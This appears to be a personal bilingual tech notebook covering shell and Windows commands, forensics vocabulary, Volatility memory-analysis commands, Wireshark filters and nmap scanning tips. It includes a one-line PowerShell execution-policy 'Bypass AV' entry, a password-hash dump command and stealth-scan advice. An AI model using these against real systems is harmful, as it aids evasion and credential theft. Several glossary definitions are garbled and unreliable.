<tr><td><code>less fichier</code></td><td>affiche <em>fichier</em> avec une navigation au clavier</td></tr>
<tr><td><code>head -n x fichier</code></td><td>affiche les x premières lignes de fichier</td></tr>
<tr><td><code>tail -n x fichier</code></td><td>affiche les x dernières lignes de fichier</td></tr>
<tr><td><code>tail -f fichier</code></td><td>affiche la dernière ligne de fichier en temps réel</td></tr>
<tr><td><code>diff file1 file2</code></td><td>affiche les différences entre deux fichiers texte</td></tr>
<tr><td><code>diff -u file1 file2</code></td><td>affiche les différences au format patch</td></tr>
<tr><td><code>comp file1 file2</code></td><td>compare deux fichiers binaires</td></tr>
<tr><td><code>comp file1 file2 n N</code></td><td>compare deux fichiers, file1 à partir du nième octet, et <em>file2</em> à partir du <strong>N</strong>ième</td></tr>
</tbody></table>
<ul>
<li>Réseau</li>
</ul>
<table><thead><tr><th>commande</th><th>action</th></tr></thead><tbody>
<tr><td><code>hostname</code></td><td>affiche le nom d'hôte de la machine</td></tr>
<tr><td><code>ping 'machine</code>'</td><td>envoie un ping à une 'machine'</td></tr>
<tr><td><code>traceroute 'machine</code>'</td><td>fait un traceroute vers 'machine'</td></tr>
<tr><td><code>netstat</code></td><td>liste les processus utilisant le réseau</td></tr>
<tr><td><code>netstat -a</code></td><td>netstat + affichage des processus serveurs</td></tr>
<tr><td><code>lsof</code></td><td>liste détaillée de l'usage des fichiers et du réseau</td></tr>
<tr><td><code>ifconfig</code></td><td>affiche la config des interfaces réseaux</td></tr>
<tr><td><code>ifconfig interface IP masque</code></td><td>configure une interface réseau</td></tr>
<tr><td><code>route</code></td><td>affiche la table de routage</td></tr>
<tr><td><code>curl ifconfig.me</code></td><td>IP publique</td></tr>
</tbody></table>
<ul>
<li>Recherche</li>
</ul>
<table><thead><tr><th>commande/option</th><th>action</th></tr></thead><tbody>
<tr><td><code>locate motif</code></td><td>recherche sur un nom correspond au motif</td></tr>
<tr><td><code>updatedb</code></td><td>mettre à jour la base de données de locate</td></tr>
<tr><td><code>find chemin options</code></td><td>recherche les fichiers dans chemin avec option</td></tr>
<tr><td><code>find -name motif</code></td><td>recherche sur le nom du fichier</td></tr>
<tr><td><code>find -type f/d/l</code></td><td>recherche par type où f=fichier,d=répertoire,l=lien</td></tr>
<tr><td><code>find -exec cmd</code></td><td>exécute la commande cmd à tous les fichiers trouvés</td></tr>
</tbody></table>
<p><strong>Exemple</strong> : trouver toutes les images avec l'extension png dans le dossier 'Images' de l'utilisateur et les copier dans le dossier tmp ( '{}' représente les fichiers trouvés).</p>
<blockquote>
<p>find $HOME/Images -name &quot;*.png&quot; -exec cp {} $HOME/tmp/ ;</p>
</blockquote>
<ul>
<li>Kernel</li>
</ul>
<p>Version du noyau Linux utilisé, son nom, la version du compilateur utilisé :</p>
<pre><code class="language-shell"># System info
$ cat /proc/version
# Version du kernel
$ uname -r
# liste les noyaux installés sur votre machine
$ dpkg -l | egrep &quot;linux-(header|image)&quot;
</code></pre>
<h2 id="windows"><a class="header" href="#windows">Windows</a></h2>
<ul>
<li>Carte reseau</li>
</ul>
<blockquote>
<p>ncpa.cpl</p>
</blockquote>
<ul>
<li>Gestion des users (Local User Manager)</li>
</ul>
<blockquote>
<p>lusrmgr.msc</p>
</blockquote>
<ul>
<li>Certificat manager </li>
</ul>
<blockquote>
<p>certmgr.msc</p>
</blockquote>
<ul>
<li>Gestionnaire de FireWall</li>
</ul>
<blockquote>
<p>WF.msc</p>
</blockquote>
<ul>
<li>Gestionnaire de la sourie</li>
</ul>
<blockquote>
<p>main.cpl</p>
</blockquote>
<ul>
<li>Gestionnaire des taches</li>
</ul>
<blockquote>
<p>tasklist.exe (console)
taskmgr.exe (GUI)</p>
</blockquote>
<ul>
<li>Applications</li>
</ul>
<blockquote>
<p>appwiz.cpl</p>
</blockquote>
<ul>
<li>List des IP</li>
</ul>
<blockquote>
<p>ipconfig</p>
</blockquote>
<ul>
<li>Bypass AV</li>
</ul>
<blockquote>
<p>#bypass ASMI
powershell -ep bypass</p>
</blockquote>
<ul>
<li>
<p>History
=&gt; Press F7</p>
</li>
<li>
<p>Screen catpure</p>
</li>
</ul>
<blockquote>
<p>Win+Shift+s</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><pre><code>                     ▄▄       
                     ██       
 ████████  ▄▄█████▄  ██▄████▄ 
     ▄█▀   ██▄▄▄▄ ▀  ██▀   ██ 
   ▄█▀      ▀▀▀▀██▄  ██    ██ 
 ▄██▄▄▄▄▄  █▄▄▄▄▄██  ██    ██ 
 ▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀   ▀▀    ▀▀ 
</code></pre>
<h2 id="my-default-configuration"><a class="header" href="#my-default-configuration">My default configuration</a></h2>
<pre><code class="language-ini"># ZSH THEME
ZSH_THEME=&quot;spaceship&quot;

# Plugins
plugins=(git z colorize colored-man-pages jump zsh-syntax-highlighting rust)

# Open Banner
neofetch
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="forensics-in"><a class="header" href="#forensics-in">Forensics (IN)</a></h1>
<h2 id="pseuso-otx-platform-de-partage-dioc"><a class="header" href="#pseuso-otx-platform-de-partage-dioc">Pseuso OTX (Platform de partage d'IOC)</a></h2>
<table><thead><tr><th>Site</th><th>Editor</th><th>Description</th></tr></thead><tbody>
<tr><td><a href="https://cybermap.kaspersky.com">Cybermap Kaspersky</a></td><td>Kaspersky</td><td>Bien mais plus vitrine</td></tr>
<tr><td><a href="https://threatmap.checkpoint.com">Thread Cloud</a></td><td>CheckPoint</td><td>Real Time</td></tr>
<tr><td><a href="https://fireeye.com/cyber-map/threat-map.html">Thread Live Map FireEye</a></td><td>CheckPoint</td><td>Best one</td></tr>
</tbody></table>
<h2 id="command-shortcut-win--r"><a class="header" href="#command-shortcut-win--r">Command shortcut (<code>Win + R</code>)</a></h2>
<table><thead><tr><th>Command</th><th>Panel</th></tr></thead><tbody>
<tr><td><code>apwiz.cpl</code></td><td>application desintaller</td></tr>
<tr><td><code>ncpa.cpl</code></td><td>panel network</td></tr>
</tbody></table>
<h2 id="nomenclatures"><a class="header" href="#nomenclatures">Nomenclatures</a></h2>
<table><thead><tr><th>Nom.</th><th>definition</th><th>Explication</th></tr></thead><tbody>
<tr><td><code>NIST/NVD</code></td><td><code>N</code>ational <code>I</code>nstitute of <code>S</code>tandard and <code>T</code>echnology <br /><code>N</code>ational <code>V</code>ulnerability <code>D</code>atabase</td><td>Consortium Americain d'analyze des vul. regroupées dans une BD : NVD</td></tr>
<tr><td>MITRE ATT&amp;CK</td><td><code>A</code>dverse <code>T</code>actics, <code>T</code>echnic and <code>C</code>ommon <code>K</code>nowledge</td><td>Consortium International qui rescensent, documente et classifie les tactiques et les techniques d'attaque.</td></tr>
<tr><td>CVE</td><td>Common Vulnerability and Exposures</td><td>Referencement d'une vulnerabilité.</td></tr>
<tr><td>CWE</td><td>Common Weakness Enumeration</td><td>Ensemble des mauvaise pratique de codage,engendrant des vuln. Elles sont identifiées et indéxées. Stocké et maintenu par le MITRE. (Existance d'un TOP 25)</td></tr>
<tr><td>Zero Day</td><td></td><td>Faille Inconnue du grand Public</td></tr>
<tr><td>CPE</td><td>Common Platform Enumeration</td><td>Recensement d'un SI.</td></tr>
<tr><td>Exploit</td><td></td><td>Code ecrit pour une faille dites.</td></tr>
<tr><td>Vulnerability Assessment</td><td></td><td>Rescencement des vul. d'un SI grâce aux CPE</td></tr>
<tr><td>CVSS</td><td>Common Vulnerability Score System</td><td>Metrique permettant d'evaluer les vuknerabilitées</td></tr>
<tr><td>OSINT</td><td>Open-Source INterligent</td><td>Ensemble des informations disponibles librement.</td></tr>
<tr><td>OTX</td><td>Open</td><td>Threat eXchange</td></tr>
<tr><td>IOC</td><td>Indice Of Compromission</td><td>Elements caracterisant une vul (nom...)</td></tr>
<tr><td>ATP</td><td>Advanced Persistant Threat</td><td>Modèle d'attaque.</td></tr>
<tr><td>ATP</td><td></td><td>Group de hacker.</td></tr>
<tr><td>IPS</td><td><code>I</code>ntrusion <code>P</code>rotection <code>S</code>ystem</td><td>Actives detections (ex: IOC, OTX, YARA...), tente d'arreter les attaques. <code>AlienVault</code> est un IDS.</td></tr>
<tr><td>IDS</td><td>Intrusion Detection System</td><td>Detection sans actions, pure detection et remonté de LOG.</td></tr>
<tr><td>FWNG</td><td></td><td></td></tr>
<tr><td>NIDS</td><td><code>N</code>etwork <code>I</code>ntrusion <code>P</code>rotection <code>S</code>ystem</td><td>System de detection des intrusion d'un réseau internet</td></tr>
<tr><td>HIDS</td><td><code>H</code>ost <code>I</code>ntrusion <code>P</code>rotection <code>S</code>ystem</td><td>Detection sur LE système hôte</td></tr>
<tr><td>WHIDS</td><td><code>W</code>ireless <code>I</code>ntrusion <code>P</code>rotection <code>S</code>ystem</td><td>Detection des communication sans fils (ex: Chellam Wifi)</td></tr>
<tr><td>MTA</td><td><code>M</code>ail <code>T</code>ransfert <code>A</code>gent</td><td>Un Mail Transfer Agent est un logiciel pour serveur de transmission de courriers électroniques.</td></tr>
<tr><td>NSE</td><td>Nmap Script Engine</td><td>module d'attaque expoitant <code>nmap</code></td></tr>
<tr><td>BPF</td><td>Berklet Paquet Filtering</td><td>Filtrage des interface network</td></tr>
</tbody></table>
<h3 id="mitre-attck"><a class="header" href="#mitre-attck">MITRE ATT&amp;CK</a></h3>
<p>A partir de la Matrice <code>ATT&amp;CK</code>, il est facile d'y extraire une liste des attaques contre lesquels il faut se premunir.
Via <code>D3fend</code>, on peut extraire les TTP (<code>T</code>actic and <code>T</code>echnic of <code>P</code>rotection).
Ensuite, on edite des regles plus specifique (IDS, IPS....) via <code>Sigma</code>???</p>
<ol>
<li>Horizontalement, nous avons les <code>ATP</code>, la <code>Kill Chain</code></li>
<li>Chaque colonne represente une <code>Ttactic</code></li>
<li>chaque item dans une colonne sont les <code>Technic</code></li>
</ol>
<h3 id="cve"><a class="header" href="#cve">CVE</a></h3>
<p>Information possible:</p>
<ul>
<li>Ref : Annee</li>
<li>Explication : ROP, Buffer Over Flow...</li>
<li>Impact : Win7, Win Server 2010</li>
<li>CVSS : Score</li>
<li>Patch : si disponible</li>
<li>Exploitation : POC (Proof Of Concept) ou POW (Proof Of Work) ou lien.</li>
</ul>
<h3 id="x-dat"><a class="header" href="#x-dat">X-dat</a></h3>
<ul>
<li><code>0-day</code> =&gt; Inconnue du publique</li>
<li><code>0.5-day</code> =&gt; Connue des milliueu fermé (Mafia, HAcker, Etat)</li>
<li><code>1-day</code> =&gt; Connue et en cours de correction (aucun correctif dispo)</li>
</ul>
<h3 id="cwe"><a class="header" href="#cwe">CWE</a></h3>
<p>Tout est dans le fonctionnelle et non dans l'exploitation.</p>
<h3 id="cpe"><a class="header" href="#cpe">CPE</a></h3>
<p>Recensement de toutes les technologies, état d'un SI:</p>
<ol>
<li>Logiciel</li>
<li>Materiel</li>
<li>OS (MMVV)</li>
<li>Matrices de flux</li>
<li>Hiérarchie des resonsabilité des <em>users</em> (admin, guest...)</li>
</ol>
<p>AGDLP (<code>A</code>ccount, <code>G</code>lobal, <code>D</code>omain <code>L</code>ocal, <code>P</code>ermission) - Politique des gestions des groupes ou politiques de sécurité</p>
<p>Technologie ROP (Restriction O P) =&gt; Définition des responsabilités par users</p>
<h3 id="scoring-cvss"><a class="header" href="#scoring-cvss">Scoring CVSS</a></h3>
<p>Version &lt; 3, 3 criteres/métrique :</p>
<ol>
<li>Exploitation</li>
<li>Reproductabilité</li>
<li>Moyen de pouvoir l'appliquer sur notre system/ elements à defendre.</li>
</ol>
<h2 id="spear-phishingphishing"><a class="header" href="#spear-phishingphishing">spear phishing/phishing</a></h2>
<p>spear phishing = phishing ciblé
phishing = phishing aui ratisse large.</p>
<h2 id="osintsocmint-and-nerd"><a class="header" href="#osintsocmint-and-nerd">OSINT/SOCMINT and nerd</a></h2>
<p>Via l'OSINT et le SOCINT, des groupes oeuvres pour le police : NERD</p>
<h2 id="malware"><a class="header" href="#malware">Malware</a></h2>
<p>Terme generic designant un logiciel malveillant.</p>
<ul>
<li><code>Virus</code> : est un type spécifique de malware qui se réplique automatiquement dans le système informatique.</li>
<li><code>Ransomware</code> : En français rançongiciel, c’est un malware qui chiffres vos données (verrouille les accès à vos données).</li>
<li><code>Trojan</code> : En français cheval de Troie est conçu pour apparaître comme un logiciel tout à fait normal, mais peut accéder à votre système.</li>
<li><code>Keylogger</code> : Un logiciel ou matériel malveillant qui peut suivre presque tout ce que vous faites sur votre ordinateur.</li>
<li><code>Rootkit</code> : c’est un logiciel malveillant capable d’obtenir un accès de niveau administrateur votre système.</li>
<li><code>Botnets</code> : pour « robot network » et en français « réseau de robots », ce sont des réseaux d’ordinateurs infectés et sous le contrôle des criminels utilisant des serveurs de contrôle(C&amp;C). </li>
<li><code>Worm</code> : « ver » en français, peut s’autorépliquer sans un contrôleur et se propage généralement sur un réseau informatique sans aucune interaction de la part des auteurs du malware. </li>
<li><code>Spyware</code> : c’est un logiciel espion capable de collecter vos informations et vos données depuis votre ordinateur.</li>
</ul>
<h2 id="site-ou-reference"><a class="header" href="#site-ou-reference">Site ou reference</a></h2>
<table><thead><tr><th>Name (URL)</th><th>Description</th></tr></thead><tbody>
<tr><td><a href="https://www.zerodium.com">ZERODIUM</a></td><td>Recencement des Vuls.</td></tr>
<tr><td><a href="https://www.fireeye.com/current-threats/annual-threat-report/mtrends.html">M-Trend</a></td><td>Rapport bi-mensuel de <code>FireEye</code> et <code>Mandiant</code></td></tr>
<tr><td><a href="forensics/github.com/redcanaryco/atomic-red-teqm">Atomic Red Team</a></td><td>Framework de test <code>FireEye</code></td></tr>
<tr><td><a href="https://github.com/gentilkiwi">gentilkiwi</a></td><td>Site du red hat Benjamin DELPY (mimikatz)</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="volatility-3-commands"><a class="header" href="#volatility-3-commands">Volatility 3 Commands</a></h1>
<p>Running <a href="https://github.com/volatilityfoundation/volatility3">Volatility 3</a> in console windows</p>
<ul>
<li>Check version.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -v
</code></pre>
<ul>
<li>Get image information.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.info
</code></pre>
<ul>
<li>See process list.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.pslist | more
</code></pre>
<ul>
<li>Filter process list searching for keyword “chrome”</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.pslist | Select-String chrome
</code></pre>
<ul>
<li>Find all handles open by process 1328.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.handles --pid 1328
</code></pre>
<ul>
<li>Find file handles and filter by - type.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.handles --pid 1328 | Select-String File | more
$ python vol.py -f [ImageName] windows.handles --pid 1328 | Select-String File | Select-String history | more
</code></pre>
<ul>
<li>Dump a file from process 1328 at virtual address.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] -o &quot;dump&quot; windows.dumpfile --pid 1328 --virtaddr 0xbf0f6abe9740
</code></pre>
<ul>
<li>Dump all files associated with PID 2520.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.dumpfiles.DumpFiles --pid 2520
</code></pre>
<ul>
<li>See executed programs with command option history.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.cmdline.CmdLine
</code></pre>
<ul>
<li>See active network connections and listening programs.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.netstat
</code></pre>
<ul>
<li>Dump the Windows user password hashes.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.hashdump.Hashdump
</code></pre>
<ul>
<li>Print out the Windows Registry UserAssist.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.registry.userassist.UserAssist
</code></pre>
<ul>
<li>List all available Windows Registry hives in memory.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.registay.hivelist.HiveList
</code></pre>
<ul>
<li>Dump the ntuser hive based on a keyword filter to the “dump” folder.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] -o &quot;dump&quot; windows.registry.hivelist --filter Doe\ntuser.dat --dump
</code></pre>
<ul>
<li>Print a specific Windows Registry key.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.registry.printkey --key &quot;Software\Microsoft\Windows\CurrentVersion&quot; --recurse
</code></pre>
<ul>
<li>Print a specific Windows Registry key, subkeys and values.</li>
</ul>
<pre><code class="language-shell">$ python vol.py -f [ImageName] windows.registry.printkey --key &quot;Software\Microsoft\Windows\CurrentVersion&quot; --recurse
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="glogg---the-fast-smart-log-explorer"><a class="header" href="#glogg---the-fast-smart-log-explorer">glogg - the fast, smart log explorer</a></h1>
<p>glogg is a multi-platform GUI application to browse and search through long or complex log files. It is designed with programmers and system administrators in mind. glogg can be seen as a graphical, interactive combination of grep and less.</p>
<p>&quot;Open big file&quot;</p>
<p><a href="https://glogg.bonnefon.org/documentation.html">Resources</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sleuht-kit"><a class="header" href="#sleuht-kit">Sleuht kit</a></h1>
<p>The Sleuth Kit® (TSK) is a library and collection of command line tools that allow you to investigate disk images. The core functionality of TSK allows you to analyze volume and file system data. The library can be incorporated into larger digital forensics tools and the command line tools can be directly used to find evidence. </p>
<h2 id="fs-analysis"><a class="header" href="#fs-analysis">FS Analysis</a></h2>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="natural-referencing"><a class="header" href="#natural-referencing">Natural Referencing</a></h1>
<h2 id="the-domain-name"><a class="header" href="#the-domain-name">The domain name</a></h2>
<ul>
<li>avoid <code>-</code> which are considered as penalizing</li>
<li>it's better without offensive words and easy to spell</li>
<li>the size of the domain name must be about 9 words</li>
<li>register your domain name for 1 year or less is characterized as suspicious</li>
<li>a valid SSL certificate is better</li>
</ul>
<h2 id="page-construction"><a class="header" href="#page-construction">Page construction</a></h2>
<ul>
<li>you need keywords related to your site</li>
<li>the content of the pages must be relevant and organized</li>
<li>if the speed of loading the page is long ( Ex: images too heavy) your site will be less well referenced</li>
<li>it is preferable to have a qualitative code</li>
<li>feature snippets: this is a portion of text that directly answers a question asked in the search engine. Indeed, it is an extract that leads the user to click on the page to get the full content. Try the site <a href="technics/natural-referencing/answerthepublic.com">Answer The Public</a> to know what people are looking for on Google (could be interested to look for your keywords).</li>
</ul>
<h2 id="backlinks"><a class="header" href="#backlinks">Backlinks</a></h2>
<p>Links that lead to your website. For Google, if a site has many backlinks, it is a popular and quality site. It also takes into account the age of the domain name that makes the incoming link. Indeed, there is a difference between Wikipedia and a site that is a few months old.</p>
<p>It takes into account the link that redirects to your site.</p>
<ul>
<li>the complete site (https://your-own-site.com), the complete site is considered of quality</li>
<li>a specific page of your site (https://your-own-site.com/a/very/specific/page/somewhere/in/your/site), there is only one interesting content.</li>
</ul>
<h2 id="user-loyalty"><a class="header" href="#user-loyalty">User loyalty</a></h2>
<ul>
<li>The more time they spend on the site, the better.</li>
<li>Encourage users to comment on content. Many comments involve a topic of interest, so users will return to the site to see the responses (⚠️ to moderation).</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-scrapping"><a class="header" href="#web-scrapping">Web Scrapping</a></h1>
<h2 id="frameworks"><a class="header" href="#frameworks">Frameworks</a></h2>
<ul>
<li>BeautifulSoup</li>
<li>MechanicalSoup</li>
<li>Scrapy</li>
<li>Photon → collection of URLs, files, specific data (emails, social networks)</li>
<li>Puppeteer</li>
</ul>
<h3 id="puppeteer"><a class="header" href="#puppeteer">Puppeteer</a></h3>
<p>Allows to drive a chromium instance (works with nodejs).</p>
<ul>
<li>automate tasks (forms, data monitoring)</li>
<li>browse web pages (tests, scrapping)</li>
<li>make screenshots or export web pages to PDF</li>
<li>capture a chronological trace of a site to diagnose performance problems</li>
<li>test chrome extensions</li>
<li>possibility to display the window to follow the navigation</li>
<li>dev chrome tools → <code>Recorder</code> allows to record a navigation and extract the puppeteer code.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><pre><code>▌ ▌▗          ▌        ▌  
▌▖▌▄ ▙▀▖▞▀▖▞▀▘▛▀▖▝▀▖▙▀▖▌▗▘
▙▚▌▐ ▌  ▛▀ ▝▀▖▌ ▌▞▀▌▌  ▛▚ 
▘ ▘▀▘▘  ▝▀▘▀▀ ▘ ▘▝▀▘▘  ▘ ▘
</code></pre>
<h2 id="filter"><a class="header" href="#filter">Filter</a></h2>
<ul>
<li>DNS</li>
</ul>
<table><thead><tr><th>Protocole</th><th>Filter</th></tr></thead><tbody>
<tr><td>DNS</td><td>dns</td></tr>
<tr><td>DNS</td><td>dns.query.response == 0</td></tr>
<tr><td>DNS</td><td>dns.query.response == 1</td></tr>
<tr><td>DNS</td><td>dns.flags.rcode == 2 [Server Failure]</td></tr>
</tbody></table>
<p>-FTP</p>
<table><thead><tr><th>Protocole</th><th>Filter</th><th>Descriptions</th></tr></thead><tbody>
<tr><td>FTP</td><td>&quot;ftp.request.command == &quot;&quot;USER&quot;&quot; &quot;</td><td>Ce filtre est utilisé pour filtrer les données en fonction d'une commande FTP spécifique(autres commandes FTP possibles)</td></tr>
<tr><td>FTP</td><td>&quot;ftp.request.arg == &quot;&quot;anonymous&quot;&quot; &quot;</td><td>Affine les arguments passés aux commandes FTP</td></tr>
<tr><td>FTP</td><td>ftp.response.code</td><td>Filtrage pour les codes spécifiques de réponse FTP, peut nous aider à identifier des problèmes spécifiques sur le réseau. Ex : si beaucoup de codes 530 dans le trafic FTP, il y a une forte chance pour que quelqu'un tente de casser les mots de passe.</td></tr>
<tr><td>FTP</td><td>&quot;ftp</td><td></td></tr>
</tbody></table>
<ul>
<li>HTTP</li>
</ul>
<table><thead><tr><th>Protocole</th><th>Filter</th></tr></thead><tbody>
<tr><td>HTTP</td><td>http</td></tr>
<tr><td>HTTP</td><td>http2</td></tr>
<tr><td>HTTP</td><td>http.set_cookie</td></tr>
<tr><td>HTTP</td><td>http.cookie</td></tr>
<tr><td>HTTP</td><td>http.request.method</td></tr>
<tr><td>HTTP</td><td>http.response.code &gt;=300 and http.response.code &lt;400 [Redirections]</td></tr>
<tr><td>HTTP</td><td>http.response.code &gt;=400 and http.response.code &lt;500 [Client-Side Errors]</td></tr>
<tr><td>HTTP</td><td>http.response.code &gt;500 [Server-Side Errors]</td></tr>
<tr><td>HTTP</td><td>http.user_agent</td></tr>
</tbody></table>
<ul>
<li>Filtres basés sur des signatures et expressions uniques</li>
</ul>
<table><thead><tr><th>Filter</th><th>Descriptions</th></tr></thead><tbody>
<tr><td>&quot;frame contains &quot;&quot;\x50\x4B\x03\x04&quot;&quot;&quot;</td><td>Signature unique pur les fichiers ZIP</td></tr>
<tr><td>&quot;frame matches &quot;&quot;(?i)(password</td><td>confidential</td></tr>
<tr><td>&quot;http matches &quot;&quot;[a-zA-Z0-9-.]+.(?i)(com)&quot;&quot; &quot;</td><td>Filtre sur tous les domaines .com du trafic HTTP</td></tr>
<tr><td>&quot;smtp matches &quot;&quot;[a-zA-Z0-9.<em>%+-]+@[a-zA-Z0-9.</em>%+-]&quot;&quot;&quot;</td><td>Permet de trouver un e-mail dans du trafic SMTP</td></tr>
</tbody></table>
<ul>
<li>Filtres pour identifier énumération SMTP||</li>
</ul>
<table><thead><tr><th>Filter</th><th>Descriptions</th></tr></thead><tbody>
<tr><td>&quot;smtp.req.command == &quot;&quot;VRFY&quot;&quot;</td><td></td></tr>
<tr><td>&quot;   smtp.req.command == &quot;&quot;RCPT&quot;&quot;&quot;</td><td></td></tr>
<tr><td>smtp.response.code == 550</td><td>Indique Action demandée non effectuée: boîte aux lettres indisponible</td></tr>
<tr><td>&quot;   smtp.req.command == &quot;&quot;RSET&quot;&quot;&quot;</td><td></td></tr>
</tbody></table>
<p>-Filtres pour identifier les attaques SMTP||</p>
<table><thead><tr><th>Filter</th><th>Descriptions</th></tr></thead><tbody>
<tr><td>smtp.response.code == 554</td><td>La transaction a échoué</td></tr>
<tr><td>smtp.response.code == 553</td><td>Destinataire non valide</td></tr>
<tr><td>&quot;smtp matches &quot;&quot;[a-zA-Z0-9._%+-]+@nmap.scanme.org&quot;&quot; &quot;</td><td>Filtre la signture Nmap tout en testant l'open relay</td></tr>
</tbody></table>
<ul>
<li>Filtres permettant de trouver une erreur/problème dans les communications mail||</li>
</ul>
<table><thead><tr><th>Filter</th><th>Descriptions</th></tr></thead><tbody>
<tr><td>smtp.response.code &gt;= 400</td><td></td></tr>
<tr><td>&quot;   pop.response.indicator == &quot;&quot;-ERR&quot;&quot;&quot;</td><td></td></tr>
</tbody></table>
<ul>
<li>Filtres permettant de montrer les identifiants de connexion e-mail||</li>
</ul>
<table><thead><tr><th>Filter</th><th>Descriptions</th></tr></thead><tbody>
<tr><td>&quot; pop.request.command == &quot;&quot;USER&quot;&quot;</td><td></td></tr>
<tr><td>&quot;   imap.request contains &quot;&quot;login&quot;&quot;&quot;</td><td></td></tr>
<tr><td>&quot;   smtp.req.command == &quot;&quot;AUTH&quot;&quot;&quot;</td><td></td></tr>
</tbody></table>
<ul>
<li>Filtres importants||</li>
</ul>
<table><thead><tr><th>Filter</th><th>Descriptions</th></tr></thead><tbody>
<tr><td>http.host</td><td></td></tr>
<tr><td>http.request</td><td></td></tr>
<tr><td>bootp.option.hostname</td><td>Hôte via DHCP</td></tr>
<tr><td>dns.qry.name</td><td>Hôte via DNS</td></tr>
<tr><td>irc.request</td><td>Commande pour joindre IRC</td></tr>
<tr><td>&quot;irc &amp;&amp; tcp matches &quot;&quot;(?i) join&quot;&quot; &quot;</td><td>Commande de requête IRC</td></tr>
</tbody></table>
<ul>
<li>Autres filtres||</li>
</ul>
<table><thead><tr><th>Filter</th><th>Descriptions</th></tr></thead><tbody>
<tr><td>wlan.wep.iv</td><td>Filtre sur le trafic chiffré WEP</td></tr>
<tr><td>llc</td><td>Pour se débarrasser du trafic 802.11</td></tr>
<tr><td>imf</td><td>Filtre les paquets Internet Message Format</td></tr>
<tr><td>http.host</td><td></td></tr>
<tr><td>http.request.uri</td><td></td></tr>
<tr><td>dns.count.answers&gt;5</td><td></td></tr>
<tr><td>http.response.code &gt; 399</td><td>Erreurs HTTP</td></tr>
<tr><td>dns.flags.rcode &gt; 0</td><td>Erreurs DNS</td></tr>
<tr><td>ftp.response.code &gt; 399</td><td>Erreur FTP</td></tr>
<tr><td>wlan.fr.retry == 1</td><td>Tentatives WLAN</td></tr>
<tr><td>ip.host == 10.1.0.20</td><td>Filtre sur une IP en particulier</td></tr>
</tbody></table>
<ul>
<li>Filtres sur TCP||</li>
</ul>
<table><thead><tr><th>Filter</th><th>Descriptions</th></tr></thead><tbody>
<tr><td>tcp.analysis.lost_segment</td><td>Paquet précédent non capturé</td></tr>
<tr><td>tcp.analysis.fast_retransmission</td><td>Retransmissions rapides TCP</td></tr>
<tr><td>tcp.analysis.duplicate_ack</td><td>ACKs dupliqués</td></tr>
<tr><td>tcp.analysis.retransmission</td><td>Retransmissions TCP</td></tr>
<tr><td>tcp.analysis.out_of_order</td><td>Segments out-of-orders</td></tr>
<tr><td>tcp.analysis.zero_window</td><td>Fenêtre à 0</td></tr>
<tr><td>tcp.window_size_value == 0</td><td></td></tr>
<tr><td>tcp.time_delta</td><td>Delta time TCP</td></tr>
<tr><td>tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0</td><td>Attaque SYN flood</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="nmap"><a class="header" href="#nmap"><a href="https://highon.coffee/blog/nmap-cheat-sheet/">NMAP</a></a></h1>
<ul>
<li>Ping scans the network, listing machines that respond to ping</li>
</ul>
<blockquote>
<p>nmap -sP &lt;IP&gt;[/&lt;MASK&gt;]</p>
</blockquote>
<blockquote>
<p>nmap -sP xx.xx.xx.&lt;RANGE1&gt;-xx.xx.xx.&lt;RANGE1&gt;</p>
</blockquote>
<blockquote>
<p>nmap -sP xx.xx.xx.*</p>
</blockquote>
<ul>
<li>Scan UDP (BIEN LIMITER LES PORTS)</li>
</ul>
<blockquote>
<p>nmap -sU </p>
</blockquote>
<ul>
<li>Utilisation de ligne de commande</li>
</ul>
<blockquote>
<p>nmap -iL file.txt</p>
</blockquote>
<p>file.txt</p>
<pre><code class="language-txt">1.1.1.1/16
1.1.1.1-1.1.1.100
1.1.1.*
</code></pre>
<h4 id="command-plus-discret"><a class="header" href="#command-plus-discret">Command plus discret</a></h4>
<ol>
<li>Port <code>WellKnown</code>(1050 ports) =&gt; port officiel.</li>
<li>Reponses possible:
<ol>
<li><code>Open</code> le port est accessible et une application est à l'ecoute</li>
<li><code>filtered</code> nmap est pas capable de savoir si le port est ouvert. Paquet filtre, machine est derriere un pare-feu </li>
<li><code>unfiltered</code> Port est accessibles mais nmap ne sait pas si il est ferme ou ouvert</li>
</ol>
</li>
</ol>
<ul>
<li><code>TCP SYN scan</code> INTERDIT à cause du SYN/ACK/RST
le RST diminu le temps de requete ce qui est flagrant.</li>
</ul>
<blockquote>
<p>nmap -Ss xx.xx.xx.xx</p>
</blockquote>
<h4 id="recommandation"><a class="header" href="#recommandation">Recommandation</a></h4>
<ul>
<li>
<p>TCP
<code>-n/-R</code> pas de DNS
<code>-P0, -Pn, -PD</code> pas de <code>Keeplive</code>. 
<code>-sV</code> scan versions (Banner Grabbling - bannière de service)
<code>-p 80,22,33</code> Scan un ou plusierus ports
<code>10 -&gt; 1044</code> Scan un range de pors
<code>-p-</code> Scan les 65000 ports (pas que les <code>WellKnown</code></p>
</li>
<li>
